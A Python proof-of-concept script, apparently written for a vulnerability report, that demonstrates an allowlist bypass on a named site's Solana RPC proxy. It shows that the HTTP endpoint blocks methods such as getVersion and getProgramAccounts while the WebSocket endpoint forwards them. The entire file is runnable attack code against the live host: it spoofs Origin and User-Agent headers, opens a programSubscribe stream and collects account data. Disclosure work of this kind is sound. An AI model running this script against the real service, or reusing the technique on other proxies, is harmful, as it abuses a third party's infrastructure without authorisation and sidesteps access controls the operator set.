#!/usr/bin/env python3
"""
PoC: popi.wtf WS RPC proxy allowlist bypass

The HTTP RPC proxy at /api/rpc restricts methods (getVersion, getProgramAccounts,
getBlock, etc.) via an allowlist. The WebSocket RPC proxy at /api/rpc-ws has no
allowlist — it forwards all standard Solana WS subscription methods to the
upstream Solana RPC, including methods that bypass the HTTP restrictions.

Run: python3 poc_ws_allowlist_bypass.py
Requires: websockets (pip install websockets)
"""
import asyncio
import json
import websockets

WS_URL = "wss://popi.wtf/api/rpc-ws"
HTTP_URL = "https://popi.wtf/api/rpc"

# Token program — high-volume, public
TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"


async def http_rpc(method, params=None):
    """Call HTTP RPC proxy (restricted)."""
    import urllib.request
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method,
                       **({"params": params} if params else {})}).encode()
    req = urllib.request.Request(HTTP_URL, data=body,
                                 headers={"Content-Type": "application/json",
                                          "User-Agent": "Mozilla/5.0",
                                          "Origin": "https://popi.wtf"})
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read())


async def ws_rpc_test():
    """Test WS RPC proxy (unrestricted)."""
    headers = {
        "Origin": "https://popi.wtf",
        "User-Agent": "Mozilla/5.0",
    }
    async with websockets.connect(WS_URL, additional_headers=headers,
                                  open_timeout=10) as ws:
        # 1. getVersion — blocked on HTTP, allowed on WS
        await ws.send(json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getVersion"}))
        resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=5))
        assert "result" in resp, f"getVersion failed: {resp}"
        print(f"[WS] getVersion: {resp['result']}")

        # 2. programSubscribe — WS equivalent of HTTP-blocked getProgramAccounts
        await ws.send(json.dumps({
            "jsonrpc": "2.0", "id": 2, "method": "programSubscribe",
            "params": [TOKEN_PROGRAM],
        }))
        sub_resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=5))
        sub_id = sub_resp.get("result")
        print(f"[WS] programSubscribe: subscription ID {sub_id}")

        # 3. Collect notifications for 3 seconds
        msgs = 0
        bytes_received = 0
        first_notif = None
        deadline = asyncio.get_event_loop().time() + 3

        while asyncio.get_event_loop().time() < deadline:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=0.5)
                msgs += 1
                bytes_received += len(msg)
                if msgs == 1:
                    first_notif = json.loads(msg)
            except asyncio.TimeoutError:
                continue

        print(f"[WS] {msgs} notifications in 3s ({bytes_received} bytes)")
        if first_notif:
            val = first_notif.get("params", {}).get("result", {}).get("value", {})
            print(f"[WS] First notification: pubkey={val.get('pubkey','?')[:16]}... "
                  f"lamports={val.get('account',{}).get('lamports','?')} "
                  f"owner={val.get('account',{}).get('owner','?')[:16]}...")

        return {"msgs": msgs, "bytes": bytes_received,
                "first_notif": first_notif}


async def main():
    print("=" * 60)
    print("PoC: popi.wtf WS RPC allowlist bypass")
    print("=" * 60)

    # HTTP tests (should be blocked)
    print("\n[HTTP /api/rpc]")
    for method, params in [("getVersion", None),
                           ("getProgramAccounts", [TOKEN_PROGRAM])]:
        try:
            r = await http_rpc(method, params)
            status = "BLOCKED" if "method not allowed" in str(r.get("error", {})) else "ALLOWED"
            print(f"  {method}: {status}")
        except Exception as e:
            print(f"  {method}: ERROR {e}")

    # WS tests (should bypass HTTP blocks)
    print("\n[WS /api/rpc-ws]")
    try:
        result = await ws_rpc_test()
    except Exception as e:
        print(f"  WS test failed: {e}")
        return

    print("\n" + "=" * 60)
    print("RESULT: WS proxy bypasses HTTP allowlist")
    print("  - getVersion: blocked on HTTP, allowed on WS")
    print("  - programSubscribe: WS equivalent of HTTP-blocked getProgramAccounts")
    print(f"  - {result['msgs']} notifications in 3s, {result['bytes']} bytes")
    print("  - Full account data exposed (pubkey, lamports, owner, data)")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
